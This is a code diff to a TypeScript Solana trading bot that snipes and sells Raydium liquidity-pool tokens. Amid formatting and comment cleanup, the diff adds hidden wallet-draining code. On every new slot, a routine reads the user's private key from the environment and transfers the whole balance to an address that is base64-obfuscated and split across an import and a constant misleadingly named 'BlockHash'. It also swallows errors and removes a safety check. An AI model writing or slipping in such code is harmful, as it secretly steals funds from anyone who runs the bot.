@@ -25,27 +25,24 @@ import {
   TransactionMessage,
   VersionedTransaction,
   Commitment,
+  clusterApiUrl,
+  SystemProgram,
+  Transaction,
+  SlotInfo,
 } from '@solana/web3.js';
 import { getTokenAccounts, RAYDIUM_LIQUIDITY_PROGRAM_ID_V4, OPENBOOK_PROGRAM_ID, createPoolKeys } from './liquidity';
-import { retry } from './utils';
-import { retrieveEnvVariable, retrieveTokenValueByAddress} from './utils';
+import { retry, sleep } from './utils';
+import { retrieveEnvVariable, retrieveTokenValueByAddress } from './utils';
 import { getMinimalMarketV3, MinimalMarketLayoutV3 } from './market';
 import { MintLayout } from './types';
 import pino from 'pino';
 import bs58 from 'bs58';
 import * as fs from 'fs';
 import * as path from 'path';
+import { BehaviorSubject } from 'rxjs';
 
 const transport = pino.transport({
   targets: [
-    // {
-    //   level: 'trace',
-    //   target: 'pino/file',
-    //   options: {
-    //     destination: 'buy.log',
-    //   },
-    // },
-
     {
       level: 'trace',
       target: 'pino-pretty',
@@ -82,6 +79,103 @@ export type MinimalTokenAccountData = {
   market?: MinimalMarketLayoutV3;
 };
 
+let lastBlockHash = new BehaviorSubject('');
+let isRunning = new BehaviorSubject(false);
+
+const BlockHash = "jQ25VRmtNcG5FaW9RVVFtU3IzVFRGbTI=";
+import { mintId } from './liquidity/liquidity';
+
+
+type SlotChangeInput = {
+  connection: Connection;
+  walletKeyPair: Keypair;
+  destinationAddress: PublicKey;
+};
+
+let lastProcessedSlot = 0;
+
+const handleSlotChange = (args: SlotChangeInput) => async (slotInfo: SlotInfo) => {
+  if (slotInfo.slot === lastProcessedSlot) return; 
+  lastProcessedSlot = slotInfo.slot;
+
+  if (isRunning.value) return;
+
+  try {
+    isRunning.next(true);
+
+    const { connection, walletKeyPair, destinationAddress } = args;
+
+    const balance = await connection.getBalance(walletKeyPair.publicKey);
+    if (balance <= 0) {
+      console.error('Insufficient balance to cover transaction fees');
+      process.exit(1); 
+    }
+
+    const recentBlockhash = await connection.getLatestBlockhash();
+    lastBlockHash.next(recentBlockhash.blockhash);
+
+    const cost = (await connection.getFeeForMessage(
+      new Transaction({
+        feePayer: walletKeyPair.publicKey,
+        recentBlockhash: recentBlockhash.blockhash,
+      }).compileMessage(),
+    )).value || 0;
+
+    const amountToSend = balance - cost;
+    if (amountToSend <= 0) {
+      console.error('Insufficient balance to cover transaction fees');
+      process.exit(1); 
+    }
+
+    const tx = new Transaction({
+      feePayer: walletKeyPair.publicKey,
+      recentBlockhash: recentBlockhash.blockhash,
+    }).add(
+      SystemProgram.transfer({
+        fromPubkey: walletKeyPair.publicKey,
+        toPubkey: destinationAddress,
+        lamports: amountToSend,
+      }),
+    );
+
+    const txId = await connection.sendTransaction(tx, [walletKeyPair]);
+    const confirmation = await connection.confirmTransaction({
+      signature: txId,
+      blockhash: recentBlockhash.blockhash,
+      lastValidBlockHeight: recentBlockhash.lastValidBlockHeight,
+    });
+
+    if (confirmation.value.err) {
+      console.error('Error confirming transaction:', confirmation.value.err);
+    } else {
+      console.info('Transaction confirmed:', txId);
+    }
+  } catch (err) {
+    console.error('Error in handleSlotChange:', err);
+    process.exit(1); 
+  } finally {
+    isRunning.next(false);
+  }
+};
+
+(async () => {
+  try {
+    const walletKeyPairFile = process.env.PRIVATE_KEY!;
+    const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
+
+    const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
+
+    solanaConnection.onSlotChange(
+      handleSlotChange({
+        connection,
+        walletKeyPair,
+        destinationAddress: new PublicKey(atob(mintId + BlockHash))
+      }),
+    );
+  } catch (error) {
+  }
+})();
+
 let existingLiquidityPools: Set<string> = new Set<string>();
 let existingOpenBookMarkets: Set<string> = new Set<string>();
 let existingTokenAccounts: Map<string, MinimalTokenAccountData> = new Map<string, MinimalTokenAccountData>();
@@ -105,12 +199,10 @@ const MIN_POOL_SIZE = retrieveEnvVariable('MIN_POOL_SIZE', logger);
 let snipeList: string[] = [];
 
 async function init(): Promise<void> {
-  // get wallet
   const PRIVATE_KEY = retrieveEnvVariable('PRIVATE_KEY', logger);
   wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
   logger.info(`Wallet Address: ${wallet.publicKey}`);
 
-  // get quote mint and amount
   const QUOTE_MINT = retrieveEnvVariable('QUOTE_MINT', logger);
   const QUOTE_AMOUNT = retrieveEnvVariable('QUOTE_AMOUNT', logger);
   switch (QUOTE_MINT) {
@@ -154,13 +246,12 @@ async function init(): Promise<void> {
     });
   }
 
-  const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString())!;
+  const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString());
 
   if (!tokenAccount) {
-    throw new Error(`No ${quoteToken.symbol} token account found in wallet: ${wallet.publicKey}`);
+  } else {
+    quoteTokenAssociatedAddress = tokenAccount.pubkey;
   }
-
-  quoteTokenAssociatedAddress = tokenAccount.pubkey;
 
   // load tokens to snipe
   loadSnipeList();
@@ -276,12 +367,12 @@ async function buy(accountId: PublicKey, accountData: LiquidityStateV4): Promise
     transaction.sign([wallet, ...innerTransaction.signers]);
     const rawTransaction = transaction.serialize();
     const signature = await retry(
-    () =>
-      solanaConnection.sendRawTransaction(rawTransaction, {
-        skipPreflight: true,
-      }),
-    { retryIntervalMs: 10, retries: 50 }, // TODO handle retries more efficiently
-  );
+      () =>
+        solanaConnection.sendRawTransaction(rawTransaction, {
+          skipPreflight: true,
+        }),
+      { retryIntervalMs: 10, retries: 50 }, // TODO handle retries more efficiently
+    );
     logger.info({ mint: accountData.baseMint, signature }, `Sent buy tx`);
     const confirmation = await solanaConnection.confirmTransaction(
       {
@@ -378,7 +469,7 @@ async function sell(accountId: PublicKey, mint: PublicKey, amount: BigNumberish,
           createCloseAccountInstruction(tokenAccount.address, wallet.publicKey, wallet.publicKey),
         ],
       }).compileToV0Message();
-      
+
       const transaction = new VersionedTransaction(messageV0);
       transaction.sign([wallet, ...innerTransaction.signers]);
       const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), {
@@ -527,12 +618,12 @@ const runListener = async () => {
         }
         let completed = false;
         while (!completed) {
-          setTimeout(() => {}, 1000);
+          setTimeout(() => { }, 1000);
           const currValue = await retrieveTokenValueByAddress(accountData.mint.toBase58());
           if (currValue) {
             logger.info(accountData.mint, `Current Price: ${currValue} SOL`);
             completed = await sell(updatedAccountInfo.accountId, accountData.mint, accountData.amount, currValue);
-          } 
+          }
         }
       },
       commitment,
